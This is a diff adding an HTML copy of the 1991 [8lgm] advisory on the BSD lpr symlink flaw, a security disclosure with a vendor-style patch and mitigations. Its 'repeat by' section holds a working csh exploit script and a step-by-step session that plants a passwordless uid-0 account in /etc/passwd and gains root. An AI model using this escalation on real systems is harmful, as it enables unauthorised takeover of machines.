@@ -1,0 +1,236 @@
+<head>
+<title>[8lgm]-Advisory-3.UNIX.lpr.19-Aug-1991</title>
+</head>
+<body>
+<hr>
+<H1>[8lgm]-Advisory-3.UNIX.lpr.19-Aug-1991
+</H1>
+<P>
+<H2>PROGRAM:</H2>
+<P>
+<PRE>
+        lpr(1)          (/usr/ucb/lpr or /usr/bin/lpr)
+</PRE>
+<P>
+<H2>VULNERABLE OS's:</H2>
+<P>
+<UL>
+<LI>        SunOS 4.1.1 or earlier
+<LI>        BSD 4.3
+<LI>        BSD NET/2 Derived Systems
+<LI>        A/UX 2.0.1
+</UL>
+<P>
+        Most systems supporting the BSD LP subsystem
+<P>
+<P>
+<H2>DESCRIPTION:</H2>
+<P>
+        lpr(1) can be used to overwrite or create (and become owner of)
+        any file on the system.  lpr -s allows users to create symbolic
+        links in lpd's spool directory (typically /var/spool/lpd).
+        After 1000 invocations of lpr, lpr will reuse the filename in
+        the spool directory, and follow the link previously installed.
+        It will thus overwrite/create any file that this link points too.
+<P>
+<H2>IMPACT:</H2>
+<P>
+        Any user with access to lpr(1) can alter system files and thus
+        become root.
+<P>
+<H2>REPEAT BY:</H2>
+<P>
+        This example demonstrates how to become root on most affected
+        machines by modifying /etc/passwd and /etc/group.  Please do
+        not do this unless you have permission.
+<P>
+        Create the following script, 'lprcp':
+<P>
+<pre>
+8<--------------------------- cut here ----------------------------
+#!/bin/csh -f
+# 
+# Usage: lprcp from-file to-file
+#
+
+if ($#argv != 2) then
+        echo Usage: lprcp from-file to-file
+        exit 1
+endif
+
+# This link stuff allows us to overwrite unreadable files,
+# should we want to.
+echo x > /tmp/.tmp.$$
+lpr -q -s /tmp/.tmp.$$
+rm -f /tmp/.tmp.$$              # lpr's accepted it, point it
+ln -s $2 /tmp/.tmp.$$           # to where we really want
+
+@ s = 0
+while ( $s != 999)              # loop 999 times
+        lpr /nofile >&/dev/null # doesn't exist, but spins the clock!
+        @ s++
+        if ( $s % 10 == 0 ) echo -n .
+end
+lpr $1                          # incoming file
+                                # user becomes owner
+rm -f /tmp/.tmp.$$
+exit 0
+8<--------------------------- cut here ----------------------------
+</pre>
+<P>
+        (Lines marked with > represent user input)
+<P>
+Make copies of /etc/passwd and /etc/group, and modify them:
+<pre>
+>       % id
+        uid=97(8lgm) gid=97(8lgm) groups=97(8lgm)
+>       % cp /etc/passwd /tmp/passwd
+>       % ex /tmp/passwd
+        /tmp/passwd: unmodified: line 42
+>       :a
+>       8lgmroot::0:0:Test account for lpr bug:/:/bin/csh
+>       .
+>       :wq
+        /tmp/passwd: 43 lines, 2188 characters.
+>       % cp /etc/group /tmp
+>       % ex /tmp/group
+        /tmp/group: unmodified: line 49
+>       :/wheel
+        wheel:*:0:root,operator
+>       :c
+>       wheel:*:0:root,operator,8lgm
+>       .
+>       :wq
+        /tmp/group: 49 lines, 944 characters.
+</pre>
+<P>
+Install our new files:
+<pre>
+>       % ./lprcp /tmp/group /etc/group
+...............................................................
+..................................
+        lpr: cannot rename /var/spool/lpd/cfA060testnode
+>       % ./lprcp /tmp/passwd /etc/passwd
+................................................................
+.................................
+        lpr: cannot rename /var/spool/lpd/cfA061testnode
+</PRE>
+<P>
+Check it worked:
+<pre>
+>       % ls -l /etc/passwd /etc/group
+        -rw-r--r--    1 8lgm          944 Mar  3 19:56 /etc/group
+        -rw-r--r--    1 8lgm         2188 Mar  3 19:59 /etc/passwd
+>       % head -1 /etc/group
+        wheel:*:0:root,operator,8lgm
+>       % grep '^8lgmroot' /etc/passwd
+        8lgmroot::0:0:Test account for lpr bug:/:/bin/csh
+</pre>
+<P>
+Become root and tidy up:
+<pre>
+>       % su 8lgmroot
+        # chown root /etc/passwd /etc/group
+        # rm -f /tmp/passwd /tmp/group
+        # 
+</PRE>        
+<h2>FIX:</h2>
+<P>
+<OL>
+<li> Contact your vendor for a fix.
+<li> In the meantime, apply the following patch, derived from
+           BSD NET/2 source, which will correct the flaw on most
+           affected systems:
+</OL>
+<P>
+<pre>
+8<--------------------------- cut here ----------------------------
+*** usr/src/usr.sbin/lpr/lpr/lpr.c.orig
+--- usr/src/usr.sbin/lpr/lpr/lpr.c
+***************
+*** 476,496 ****
+  
+  /*
+   * Create a new file in the spool directory.
+   */
+  nfile(n)
+        char *n;
+  {
+        register f;
+        int oldumask = umask(0);                /* should block signals */
+  
+!       f = creat(n, FILMOD);
+        (void) umask(oldumask);
+        if (f < 0) {
+                printf("%s: cannot create %s\n", name, n);
+                cleanup();
+        }
+        if (fchown(f, userid, -1) < 0) {
+                printf("%s: cannot chown %s\n", name, n);
+                cleanup();
+        }
+        if (++n[inchar] > 'z') {
+--- 476,501 ----
+  
+  /*
+   * Create a new file in the spool directory.
+   */
+  nfile(n)
+        char *n;
+  {
+        register f;
+        int oldumask = umask(0);                /* should block signals */
+  
+!       /*
+!        * Changed creat() to open() to correct
+!        * a security flaw involving symlinks
+!        */
+!       /* f = creat(n, FILMOD); */
+!       f = open(n, O_WRONLY|O_EXCL|O_CREAT, FILMOD);
+        (void) umask(oldumask);
+        if (f < 0) {
+                printf("%s: cannot create %s\n", name, n);
+                cleanup();
+        }
+        if (fchown(f, userid, -1) < 0) {
+                printf("%s: cannot chown %s\n", name, n);
+                cleanup();
+        }
+        if (++n[inchar] > 'z') {
+8<--------------------------- cut here ----------------------------
+</pre>
+<P>
+<OL>
+<li> If you do not have source, you are advised to obtain the BSD
+           LP subsystem from the NET/2 release (available from ftp.uu.net),
+           apply the above patch, and use that.
+<P>
+<li> Alternatively, some vendors supply both the BSD and SYS V
+           LP subsystems, in which case you can disable BSD lpr/lpd
+           and use SYS V lp/lpsched instead.
+<P>
+<li> If none of the above are practical, you are advised to restrict
+           access (via groups) to lpr.  If lpr is mode 6755 on your system,
+           you can still do this using a directory and a symbolic link.
+</OL>
+<P>
+<P>
+<H2>FEEDBACK AND CONTACT INFORMATION:</H2>
+<P>
+<PRE>
+        8lgm-bugs@bagpuss.demon.co.uk           (To report security flaws)
+<P>
+        8lgm-request@bagpuss.demon.co.uk        (Request for [8lgm] Advisories)
+<P>
+        8lgm@bagpuss.demon.co.uk                (General enquiries)
+</PRE>
+<P>
+        System Administrators are encouraged to contact us for any
+        other information they may require about the problems described
+        in this advisory.
+<P>
+        We welcome reports about which platforms this flaw does or does
+        not exist on.
+<P>
+<hr>
+</body>
